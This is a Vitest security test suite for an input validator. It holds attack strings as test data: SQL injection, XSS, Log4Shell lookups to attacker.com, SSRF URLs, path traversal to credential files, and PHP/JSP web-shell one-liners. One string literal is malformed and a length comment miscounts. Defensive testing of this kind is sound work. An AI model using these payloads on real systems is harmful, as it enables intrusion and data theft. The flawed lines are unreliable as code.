/**
 * Input Validation Security Tests
 *
 * This test suite validates that all user input is properly sanitized,
 * validated, and encoded to prevent injection attacks and data corruption.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { render, screen, fireEvent } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { BrowserRouter } from 'react-router-dom';
import React from 'react';

// Import security utilities
import apiSecurityValidator from '@/lib/api-security-validator';
import securityAuditor from '@/lib/security-audit';
import securityMonitoring from '@/lib/security-monitoring';

// Import DOMPurify for XSS protection
import DOMPurify from 'dompurify';

describe('Input Validation Security Tests', () => {
  beforeEach(() => {
    vi.stubEnv('NODE_ENV', 'test');

    // Reset security monitoring
    securityMonitoring['metrics'] = securityMonitoring['initializeMetrics']();
    securityMonitoring['alerts'] = [];
    securityAuditor['events'] = [];
  });

  afterEach(() => {
    vi.unstubAllEnvs();
    vi.clearAllMocks();
  });

  describe('General Input Validation', () => {
    it('should reject null and undefined inputs', () => {
      const invalidInputs = [null, undefined, '', '   '];

      invalidInputs.forEach(input => {
        const result = apiSecurityValidator.validateInput(input, 'string');
        expect(result.safe).toBe(false);
        expect(result.reason).toContain('empty');
      });
    });

    it('should validate input length constraints', () => {
      const lengthTests = [
        { input: 'a'.repeat(10), minLength: 5, maxLength: 20, expected: true },
        { input: 'a'.repeat(4), minLength: 5, maxLength: 20, expected: false },
        { input: 'a'.repeat(21), minLength: 5, maxLength: 20, expected: false },
        { input: 'valid', minLength: null, maxLength: 10, expected: true },
      ];

      lengthTests.forEach(test => {
        const result = apiSecurityValidator.validateInputLength(test.input, {
          minLength: test.minLength,
          maxLength: test.maxLength,
        });

        expect(result.valid).toBe(test.expected);
      });
    });

    it('should validate character sets and encoding', () => {
      const encodingTests = [
        {
          input: 'Hello World',
          allowedCharset: 'ascii',
          expected: true,
        },
        {
          input: 'Hello Wörld',
          allowedCharset: 'ascii',
          expected: false,
        },
        {
          input: 'Hello 世界',
          allowedCharset: 'utf8',
          expected: true,
        },
        {
          input: '\x00\x01\x02',
          allowedCharset: 'printable',
          expected: false,
        },
      ];

      encodingTests.forEach(test => {
        const result = apiSecurityValidator.validateCharset(test.input, test.allowedCharset);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should detect and prevent buffer overflow attempts', () => {
      const overflowAttempts = [
        'A'.repeat(10000),
        'A'.repeat(100000),
        'A'.repeat(1000000),
        'A'.repeat(10000000),
      ];

      overflowAttempts.forEach(input => {
        const result = apiSecurityValidator.detectBufferOverflow(input);
        expect(result.detected).toBe(input.length > 100000);
        expect(result.action).toContain('reject');
      });
    });
  });

  describe('Email Validation', () => {
    it('should validate email format correctly', () => {
      const emailTests = [
        { email: 'user@example.com', expected: true },
        { email: 'user.name@example.com', expected: true },
        { email: 'user+tag@example.com', expected: true },
        { email: 'user@sub.example.com', expected: true },
        { email: 'invalid-email', expected: false },
        { email: '@example.com', expected: false },
        { email: 'user@', expected: false },
        { email: 'user..name@example.com', expected: false },
        { email: 'user@.example.com', expected: false },
        { email: 'user@example..com', expected: false },
      ];

      emailTests.forEach(test => {
        const result = apiSecurityValidator.validateEmail(test.email);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should prevent email-based injection attacks', () => {
      const maliciousEmails = [
        'user@example.com'; DROP TABLE users; --',
        'user@example.com\' OR \'1\'=\'1',
        'user@example.com< script>alert(1)</script>',
        '${jndi:ldap://attacker.com/a}',
        '{{7*7}}@example.com',
      ];

      maliciousEmails.forEach(email => {
        const result = apiSecurityValidator.validateEmail(email);
        expect(result.valid).toBe(false);
        expect(result.issues.some(issue => issue.includes('injection'))).toBe(true);
      });
    });

    it('should enforce email length limits', () => {
      const longEmail = 'a'.repeat(245) + '@example.com'; // Total 254 characters
      const tooLongEmail = 'a'.repeat(255) + '@example.com'; // Over 254 characters

      const validResult = apiSecurityValidator.validateEmail(longEmail);
      const invalidResult = apiSecurityValidator.validateEmail(tooLongEmail);

      expect(validResult.valid).toBe(true);
      expect(invalidResult.valid).toBe(false);
      expect(invalidResult.issues.some(issue => issue.includes('length'))).toBe(true);
    });
  });

  describe('Phone Number Validation', () => {
    it('should validate phone number formats', () => {
      const phoneTests = [
        { phone: '+1-555-123-4567', expected: true },
        { phone: '+44 20 7123 4567', expected: true },
        { phone: '+48 123 456 789', expected: true },
        { phone: '555-123-4567', expected: true },
        { phone: '1234567', expected: false },
        { phone: 'phone-number', expected: false },
        { phone: '+1-555-123-4567; DROP TABLE users; --', expected: false },
      ];

      phoneTests.forEach(test => {
        const result = apiSecurityValidator.validatePhoneNumber(test.phone);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should prevent phone-based injection', () => {
      const maliciousPhones = [
        '+1-555-123-4567\'; DROP TABLE users; --',
        '555-123-4567 OR 1=1',
        '${jndi:ldap://attacker.com/a}',
      ];

      maliciousPhones.forEach(phone => {
        const result = apiSecurityValidator.validatePhoneNumber(phone);
        expect(result.valid).toBe(false);
        expect(result.issues.some(issue => issue.includes('injection'))).toBe(true);
      });
    });
  });

  describe('URL Validation', () => {
    it('should validate URL formats correctly', () => {
      const urlTests = [
        { url: 'https://example.com', expected: true },
        { url: 'https://www.example.com/path', expected: true },
        { url: 'https://example.com/path?query=value', expected: true },
        { url: 'http://localhost:3000', expected: true },
        { url: 'ftp://files.example.com', expected: false },
        { url: 'javascript:alert(1)', expected: false },
        { url: 'data:text/html,<script>alert(1)</script>', expected: false },
        { url: 'vbscript:msgbox(1)', expected: false },
        { url: 'file:///etc/passwd', expected: false },
        { url: 'not-a-url', expected: false },
      ];

      urlTests.forEach(test => {
        const result = apiSecurityValidator.validateURL(test.url);
        expect(result.safe).toBe(test.expected);
      });
    });

    it('should prevent SSRF through URL validation', () => {
      const ssrfUrls = [
        'http://localhost/admin',
        'http://127.0.0.1:22',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'ftp://192.168.1.1/files',
        'gopher://192.168.1.1:80/_GET%20%2f',
      ];

      ssrfUrls.forEach(url => {
        const result = apiSecurityValidator.validateURL(url);
        expect(result.safe).toBe(false);
        expect(result.reason).toContain('SSRF');
      });
    });

    it('should validate domain allowlists', () => {
      const allowlistTests = [
        {
          url: 'https://trusted.com',
          allowedDomains: ['trusted.com', 'example.com'],
          expected: true,
        },
        {
          url: 'https://evil.com',
          allowedDomains: ['trusted.com', 'example.com'],
          expected: false,
        },
        {
          url: 'https://sub.trusted.com',
          allowedDomains: ['trusted.com'],
          expected: true,
        },
      ];

      allowlistTests.forEach(test => {
        const result = apiSecurityValidator.validateURLDomain(test.url, test.allowedDomains);
        expect(result.allowed).toBe(test.expected);
      });
    });
  });

  describe('Numeric Input Validation', () => {
    it('should validate numeric types and ranges', () => {
      const numericTests = [
        { input: '123', type: 'integer', min: 0, max: 1000, expected: true },
        { input: '-50', type: 'integer', min: 0, max: 1000, expected: false },
        { input: '1500', type: 'integer', min: 0, max: 1000, expected: false },
        { input: '123.45', type: 'float', min: 0, max: 1000, expected: true },
        { input: 'NaN', type: 'float', expected: false },
        { input: 'Infinity', type: 'float', expected: false },
        { input: '123abc', type: 'integer', expected: false },
      ];

      numericTests.forEach(test => {
        const result = apiSecurityValidator.validateNumber(test.input, {
          type: test.type,
          min: test.min,
          max: test.max,
        });

        expect(result.valid).toBe(test.expected);
      });
    });

    it('should prevent numeric injection attacks', () => {
      const numericInjections = [
        '123; DROP TABLE users; --',
        "123' OR '1'='1",
        '123 UNION SELECT * FROM users',
        '${jndi:ldap://attacker.com/a}',
        '1e309', // Very large number that could cause overflow
        '-1e309', // Very small number that could cause underflow
      ];

      numericInjections.forEach(input => {
        const result = apiSecurityValidator.validateNumber(input);
        expect(result.valid).toBe(false);
        expect(result.issues.some(issue =>
          issue.includes('injection') || issue.includes('invalid')
        )).toBe(true);
      });
    });
  });

  describe('Date and Time Validation', () => {
    it('should validate date formats and ranges', () => {
      const dateTests = [
        { input: '2024-01-01', format: 'YYYY-MM-DD', expected: true },
        { input: '2024-13-01', format: 'YYYY-MM-DD', expected: false },
        { input: '2024-02-30', format: 'YYYY-MM-DD', expected: false },
        { input: '2024-01-01T10:00:00Z', format: 'ISO8601', expected: true },
        { input: '01/01/2024', format: 'YYYY-MM-DD', expected: false },
        { input: 'not-a-date', format: 'YYYY-MM-DD', expected: false },
      ];

      dateTests.forEach(test => {
        const result = apiSecurityValidator.validateDate(test.input, test.format);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should prevent date-based injection', () => {
      const maliciousDates = [
        '2024-01-01\'; DROP TABLE users; --',
        '2024-01-01 OR 1=1',
        '${jndi:ldap://attacker.com/a}',
      ];

      maliciousDates.forEach(date => {
        const result = apiSecurityValidator.validateDate(date, 'YYYY-MM-DD');
        expect(result.valid).toBe(false);
        expect(result.issues.some(issue => issue.includes('injection'))).toBe(true);
      });
    });

    it('should validate realistic date ranges', () => {
      const rangeTests = [
        {
          input: '1899-01-01',
          minYear: 1900,
          maxYear: 2100,
          expected: false,
        },
        {
          input: '2101-01-01',
          minYear: 1900,
          maxYear: 2100,
          expected: false,
        },
        {
          input: '2024-01-01',
          minYear: 1900,
          maxYear: 2100,
          expected: true,
        },
      ];

      rangeTests.forEach(test => {
        const result = apiSecurityValidator.validateDateRange(test.input, {
          minYear: test.minYear,
          maxYear: test.maxYear,
        });

        expect(result.valid).toBe(test.expected);
      });
    });
  });

  describe('File Upload Validation', () => {
    it('should validate file types and extensions', () => {
      const fileTests = [
        {
          filename: 'image.jpg',
          contentType: 'image/jpeg',
          allowedTypes: ['image/jpeg', 'image/png'],
          expected: true,
        },
        {
          filename: 'script.js',
          contentType: 'application/javascript',
          allowedTypes: ['image/jpeg', 'image/png'],
          expected: false,
        },
        {
          filename: 'image.php',
          contentType: 'image/jpeg', // Mismatch
          allowedTypes: ['image/jpeg'],
          expected: false,
        },
      ];

      fileTests.forEach(test => {
        const result = apiSecurityValidator.validateFileType({
          filename: test.filename,
          contentType: test.contentType,
          allowedTypes: test.allowedTypes,
        });

        expect(result.allowed).toBe(test.expected);
      });
    });

    it('should validate file size limits', () => {
      const sizeTests = [
        { size: 1024 * 1024, limit: 5 * 1024 * 1024, expected: true }, // 1MB < 5MB
        { size: 10 * 1024 * 1024, limit: 5 * 1024 * 1024, expected: false }, // 10MB > 5MB
        { size: 0, limit: 5 * 1024 * 1024, expected: false }, // Empty file
      ];

      sizeTests.forEach(test => {
        const result = apiSecurityValidator.validateFileSize(test.size, test.limit);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should prevent malicious file uploads', () => {
      const maliciousFiles = [
        { filename: 'shell.php', content: '<?php system($_GET["cmd"]); ?>' },
        { filename: 'backdoor.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { filename: 'exploit.exe', content: 'MZ\x90\x00' },
        { filename: 'script.js', content: '<script>alert(document.cookie)</script>' },
        { filename: '.htaccess', content: 'Options +ExecCGI' },
      ];

      maliciousFiles.forEach(file => {
        const result = apiSecurityValidator.validateFileContent(file);
        expect(result.safe).toBe(false);
        expect(result.threats.length).toBeGreaterThan(0);
      });
    });

    it('should validate file names for path traversal', () => {
      const maliciousFilenames = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
      ];

      maliciousFilenames.forEach(filename => {
        const result = apiSecurityValidator.validateFilename(filename);
        expect(result.safe).toBe(false);
        expect(result.issues.some(issue => issue.includes('path traversal'))).toBe(true);
      });
    });
  });

  describe('JSON Input Validation', () => {
    it('should validate JSON structure safely', () => {
      const jsonTests = [
        {
          input: '{"name": "John", "age": 30}',
          schema: { type: 'object', required: ['name', 'age'] },
          expected: true,
        },
        {
          input: '{"name": "John"}',
          schema: { type: 'object', required: ['name', 'age'] },
          expected: false,
        },
        {
          input: 'invalid json',
          schema: { type: 'object' },
          expected: false,
        },
      ];

      jsonTests.forEach(test => {
        const result = apiSecurityValidator.validateJSON(test.input, test.schema);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should prevent JSON-based attacks', () => {
      const maliciousJSON = [
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"key": {"$ref": "https://attacker.com/payload.json"}}',
        '{"rce": "__import__(\'os\').system(\'ls\')"}',
        '{"key": {"$where": "this.password == \'admin\'"}}',
      ];

      maliciousJSON.forEach(jsonString => {
        const result = apiSecurityValidator.validateJSONSecurity(jsonString);
        expect(result.safe).toBe(false);
        expect(result.threats.length).toBeGreaterThan(0);
      });
    });

    it('should prevent prototype pollution through JSON', () => {
      const pollutionPayloads = [
        { '__proto__': { 'admin': true } },
        { 'constructor': { 'prototype': { 'isAdmin': true } } },
        { 'prototype': { 'polluted': true } },
      ];

      pollutionPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectPrototypePollution(payload);
        expect(result.detected).toBe(true);
      });
    });
  });

  describe('HTML and Content Validation', () => {
    it('should sanitize HTML content', () => {
      const htmlTests = [
        {
          input: '<p>Hello World</p>',
          expected: '<p>Hello World</p>',
        },
        {
          input: '<script>alert("xss")</script><p>Hello</p>',
          expected: '<p>Hello</p>', // Script should be removed
        },
        {
          input: '<img src="x" onerror="alert(1)">',
          expected: '<img src="x">', // onerror should be removed
        },
        {
          input: '<a href="javascript:alert(1)">Click</a>',
          expected: '<a>Click</a>', // javascript: should be removed
        },
      ];

      htmlTests.forEach(test => {
        const sanitized = DOMPurify.sanitize(test.input);
        expect(sanitized).toBe(test.expected);
      });
    });

    it('should validate rich text content safely', () => {
      const richTextTests = [
        {
          input: '<strong>Bold text</strong>',
          allowedTags: ['strong', 'em', 'p'],
          expected: true,
        },
        {
          input: '<script>alert(1)</script>',
          allowedTags: ['strong', 'em', 'p'],
          expected: false,
        },
        {
          input: '<img src="x" onerror="alert(1)">',
          allowedTags: ['img'],
          allowedAttributes: { 'img': ['src'] },
          expected: false, // onerror not allowed
        },
      ];

      richTextTests.forEach(test => {
        const result = apiSecurityValidator.validateRichText(test.input, {
          allowedTags: test.allowedTags,
          allowedAttributes: test.allowedAttributes,
        });

        expect(result.safe).toBe(test.expected);
      });
    });

    it('should prevent content injection through various vectors', () => {
      const injectionVectors = [
        '<script>alert(1)</script>',
        'javascript:alert(1)',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<link rel="stylesheet" href="javascript:alert(1)">',
      ];

      injectionVectors.forEach(vector => {
        const result = apiSecurityValidator.detectContentInjection(vector);
        expect(result.detected).toBe(true);
        expect(result.type).toContain('xss');
      });
    });
  });

  describe('Database Input Validation', () => {
    it('should prevent SQL injection in all inputs', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM users WHERE 1=1; --",
        "' UNION SELECT username, password FROM users --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR 1=1 #",
        "' UNION SELECT @@version --",
        "'; ALTER TABLE users ADD COLUMN test VARCHAR(255); --",
      ];

      sqlInjections.forEach(injection => {
        const result = apiSecurityValidator.detectSQLInjection(injection);
        expect(result.detected).toBe(true);
        expect(result.patterns.length).toBeGreaterThan(0);
      });
    });

    it('should validate database identifiers', () => {
      const identifierTests = [
        { identifier: 'users', expected: true },
        { identifier: 'user_profiles', expected: true },
        { identifier: 'users; DROP TABLE test; --', expected: false },
        { identifier: '1 OR 1=1', expected: false },
        { identifier: 'users`', expected: false }, // Backtick not allowed
      ];

      identifierTests.forEach(test => {
        const result = apiSecurityValidator.validateDatabaseIdentifier(test.identifier);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should validate SQL query parameters', () => {
      const queryTests = [
        {
          query: 'SELECT * FROM users WHERE id = ?',
          params: [123],
          expected: true,
        },
        {
          query: 'SELECT * FROM users WHERE id = ?',
          params: ["'; DROP TABLE users; --"],
          expected: false,
        },
        {
          query: 'SELECT * FROM users WHERE name = ?',
          params: ["admin' OR '1'='1"],
          expected: false,
        },
      ];

      queryTests.forEach(test => {
        const result = apiSecurityValidator.validateSQLQuery(test.query, test.params);
        expect(result.safe).toBe(test.expected);
      });
    });
  });

  describe('Form Validation Security', () => {
    it('should validate form submissions comprehensively', () => {
      const formTests = [
        {
          formData: {
            name: 'John Doe',
            email: 'john@example.com',
            phone: '+1-555-123-4567',
            message: 'Hello World',
          },
          schema: {
            name: { type: 'string', required: true, maxLength: 100 },
            email: { type: 'email', required: true },
            phone: { type: 'phone', required: false },
            message: { type: 'string', required: true, maxLength: 1000 },
          },
          expected: true,
        },
        {
          formData: {
            name: '<script>alert(1)</script>',
            email: 'invalid-email',
            phone: '123; DROP TABLE users; --',
            message: '',
          },
          schema: {
            name: { type: 'string', required: true, maxLength: 100 },
            email: { type: 'email', required: true },
            phone: { type: 'phone', required: false },
            message: { type: 'string', required: true, maxLength: 1000 },
          },
          expected: false,
        },
      ];

      formTests.forEach(test => {
        const result = apiSecurityValidator.validateForm(test.formData, test.schema);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should prevent form-based CSRF attacks', () => {
      const csrfTests = [
        {
          formData: { action: 'delete', id: '123' },
          origin: 'https://evil.com',
          targetOrigin: 'https://app.com',
          hasCSRFToken: false,
          expected: false,
        },
        {
          formData: { action: 'delete', id: '123' },
          origin: 'https://app.com',
          targetOrigin: 'https://app.com',
          hasCSRFToken: true,
          expected: true,
        },
      ];

      csrfTests.forEach(test => {
        const result = apiSecurityValidator.validateCSRF(test);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should validate multi-part form data', () => {
      const multipartTests = [
        {
          fields: {
            name: 'John Doe',
            description: 'Valid description',
          },
          files: [
            { name: 'image.jpg', type: 'image/jpeg', size: 1024 },
          ],
          expected: true,
        },
        {
          fields: {
            name: '<script>alert(1)</script>',
            description: 'Valid description',
          },
          files: [
            { name: 'script.js', type: 'application/javascript', size: 1024 },
          ],
          expected: false,
        },
      ];

      multipartTests.forEach(test => {
        const result = apiSecurityValidator.validateMultipartForm(test);
        expect(result.valid).toBe(test.expected);
      });
    });
  });

  describe('API Parameter Validation', () => {
    it('should validate query parameters', () => {
      const queryTests = [
        {
          query: { id: '123', name: 'John', active: 'true' },
          schema: {
            id: { type: 'integer', required: true },
            name: { type: 'string', maxLength: 50 },
            active: { type: 'boolean' },
          },
          expected: true,
        },
        {
          query: { id: "'; DROP TABLE users; --", name: 'John' },
          schema: {
            id: { type: 'integer', required: true },
            name: { type: 'string', maxLength: 50 },
          },
          expected: false,
        },
      ];

      queryTests.forEach(test => {
        const result = apiSecurityValidator.validateQueryParams(test.query, test.schema);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should validate path parameters', () => {
      const pathTests = [
        {
          params: { userId: '123', orderId: '456' },
          constraints: { userId: /^\d+$/, orderId: /^\d+$/ },
          expected: true,
        },
        {
          params: { userId: '../admin', orderId: '456' },
          constraints: { userId: /^\d+$/, orderId: /^\d+$/ },
          expected: false,
        },
      ];

      pathTests.forEach(test => {
        const result = apiSecurityValidator.validatePathParams(test.params, test.constraints);
        expect(result.valid).toBe(test.expected);
      });
    });

    it('should validate request headers', () => {
      const headerTests = [
        {
          headers: {
            'Content-Type': 'application/json',
            'X-API-Key': 'valid-key',
          },
          allowedHeaders: ['Content-Type', 'X-API-Key'],
          expected: true,
        },
        {
          headers: {
            'Content-Type': 'application/json',
            'X-Injected': '../etc/passwd',
          },
          allowedHeaders: ['Content-Type'],
          expected: false,
        },
      ];

      headerTests.forEach(test => {
        const result = apiSecurityValidator.validateHeaders(test.headers, test.allowedHeaders);
        expect(result.valid).toBe(test.expected);
      });
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize HTML content', () => {
      const sanitizationTests = [
        {
          input: '<script>alert("xss")</script><p>Hello</p>',
          expected: '<p>Hello</p>',
        },
        {
          input: '<img src="x" onerror="alert(1)">',
          expected: '<img src="x">',
        },
        {
          input: '<a href="javascript:alert(1)">Link</a>',
          expected: '<a>Link</a>',
        },
      ];

      sanitizationTests.forEach(test => {
        const sanitized = apiSecurityValidator.sanitizeHTML(test.input);
        expect(sanitized).toBe(test.expected);
      });
    });

    it('should escape special characters in output', () => {
      const escapingTests = [
        { input: '<script>alert(1)</script>', context: 'html', expected: '&lt;script&gt;alert(1)&lt;/script&gt;' },
        { input: "'; DROP TABLE users; --", context: 'sql', expected: "''; DROP TABLE users; --" },
        { input: '${jndi:ldap://attacker.com/a}', context: 'log', expected: '${jndi:ldap://attacker.com/a}' },
      ];

      escapingTests.forEach(test => {
        const escaped = apiSecurityValidator.escapeOutput(test.input, test.context);
        expect(escaped).toContain(test.expected);
      });
    });

    it('should normalize Unicode input', () => {
      const unicodeTests = [
        { input: 'café', expected: 'café' },
        { input: 'cafe\u0301', expected: 'café' }, // Normalized form
        { input: '𝔉𝔞𝔫𝔠𝔶', expected: null }, // Should reject fancy Unicode
        { input: 'admin\u202e', expected: null }, // Should reject right-to-left override
      ];

      unicodeTests.forEach(test => {
        const result = apiSecurityValidator.normalizeUnicode(test.input);
        if (test.expected === null) {
          expect(result.safe).toBe(false);
        } else {
          expect(result.normalized).toBe(test.expected);
        }
      });
    });
  });

  describe('Validation Logging and Monitoring', () => {
    it('should log validation failures', () => {
      const invalidInputs = [
        { input: '<script>alert(1)</script>', type: 'html' },
        { input: "'; DROP TABLE users; --", type: 'sql' },
        { input: '../../../etc/passwd', type: 'filename' },
      ];

      invalidInputs.forEach(input => {
        apiSecurityValidator.validateInput(input.input, input.type);
        securityMonitoring.recordSecurityViolation('invalid_input');
      });

      const metrics = securityMonitoring.getSecurityMetrics();
      expect(metrics.securityViolations).toBeGreaterThan(0);
    });

    it('should detect patterns of invalid input', () => {
      // Simulate multiple validation failures from same IP
      for (let i = 0; i < 10; i++) {
        apiSecurityValidator.validateInput('<script>alert(1)</script>', 'html');
        securityMonitoring.recordRequest('/api/test', 'POST', '192.168.1.100');
      }

      const alerts = securityMonitoring.getSecurityAlerts();
      expect(alerts.some(alert => alert.type === 'validation_attack')).toBe(true);
    });

    it('should provide validation metrics', () => {
      const validationTests = [
        { input: 'valid@email.com', type: 'email', expected: true },
        { input: 'invalid-email', type: 'email', expected: false },
        { input: '123', type: 'number', expected: true },
        { input: 'abc', type: 'number', expected: false },
      ];

      let validCount = 0;
      let invalidCount = 0;

      validationTests.forEach(test => {
        const result = apiSecurityValidator.validateInput(test.input, test.type);
        if (result.safe === test.expected) {
          validCount++;
        } else {
          invalidCount++;
        }
      });

      expect(validCount).toBe(4); // All validations should work correctly
      expect(invalidCount).toBe(0);
    });
  });
});